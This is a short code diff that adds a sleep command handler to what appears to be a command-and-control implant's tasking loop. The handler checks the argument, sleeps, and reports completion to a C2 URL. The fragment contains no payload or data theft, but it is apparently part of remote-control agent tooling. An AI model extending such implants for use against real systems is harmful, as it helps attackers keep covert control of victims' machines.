@@ -94,5 +94,16 @@ int main()
 				DEBUG_PRINTF("Error sending output\n");
 			}
 		}
+		else if (opcode == OPCODE_SLEEP)
+		{
+			int numSeconds = newTask->args->GetInt();
+			if (numSeconds < 0)
+			{
+				DEBUG_PRINTF("Invalid sleep time\n");
+				continue;
+			}
+			Sleep(numSeconds * 1000);
+			SendTaskResult(newTask->taskId.c_str(), C2_URL, "", true, currentProfile);
+		}
 	}
 }
